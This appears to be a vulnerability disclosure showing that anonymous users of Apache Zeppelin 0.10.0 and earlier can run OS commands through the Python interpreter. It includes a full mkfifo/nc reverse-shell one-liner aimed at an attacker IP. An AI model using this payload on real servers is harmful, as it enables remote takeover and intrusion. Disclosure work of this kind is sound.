### Command injection vulnerability in Apache Zeppelin allows an attacker to inject system commands into Python interpreter settings. This issue affects Apache Zeppelin Apache Zeppelin version 0.10.0 and prior versions.

### Severity : Critical
Zeppelin version 0.10.0 to prior versions

Demo installation: http://127.0.0.1:8888/


### Reproduce bug:


Step 1: Access to http://127.0.0.1:8888/ with anonymous user and create new note with python interpreter.

![](create.png)


Step 2: After create newnote with python interpreter, try to import os lib from python and execute os command.

Execute 'whoami' and 'uname -a' to discovery server 

![](whoami.png)

![](uname.png)

Try to create reverse shell from this note with reverse shell payload:

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.11.36 90 >/tmp/f

nc from attacker machine:

![](reverse.png)


Check Version from Configuration: 
![](version.png)

### Impact : Run abitrary os command and compromised server. 

